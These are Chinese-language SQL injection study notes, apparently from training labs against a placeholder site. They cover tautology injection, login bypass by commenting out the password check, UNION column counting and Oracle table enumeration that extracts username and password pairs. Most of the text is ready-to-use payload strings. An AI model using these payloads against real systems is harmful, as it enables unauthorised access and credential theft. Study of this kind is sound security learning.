## 导入
### 检索隐藏数据

正常逻辑：

请求：
https://insecure-website.com/products?category=Gifts

数据库语句：
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

注入攻击：
https://insecure-website.com/products?category=Gifts' and 1=1--

数据库语句：
SELECT * FROM products WHERE category = 'Gifts' and 1=1--'AND released = 1

由此数据库语句后面的判断语句就是永真了

### 身份验证绕过破坏逻辑

登录处将用户名处改为xxx'--
username=administrator%27--&password=1

数据库语句：
SELECT * FROM users WHERE username = 'administrator'--' AND password = '1'

将后面的判断注释掉

## union联合查询

一
' order by 1--
' order by 2--
' order by 3--

二
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
如果空值的数量与列数不匹配，数据库将返回错误，例如：
>All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

?category=Gifts' UNION SELECT NULL,NULL,NULL--

字符分割：
当联合查询时，查询可能仅返回单个列
例如
Gifts'+union+select+'123','abc'--
这里只有abc的位置能回显

这里可以用字符分割符去分割查询结果：
例如Oracle用的`||`符号
Gifts'+union+select+NULL,username||'~'||password+from+users--
返回结果：wiener~ro1g3dp7vf6ryhptj5pp

### oracle数据库查询

与mysql不同的是，oracle在查询时必须要有from子句，在oracle中的数据库查询有以下表达

表名：
SELECT owner, table_name FROM ALL_TABLES;

列名
SELECT owner, table_name, column_name, data_type, data_length FROM ALL_TAB_COLUMNS;

Gifts'+union+select+table_name,null+from+ALL_TABLES--
Gifts'+union+select+column_name,null+from+ALL_TAB_COLUMNS+where+table_name='USERS_PTHGLT'--
Gifts'+union+select+USERNAME_VUYDKD||'~'||PASSWORD_DOEROP,null+from+USERS_PTHGLT--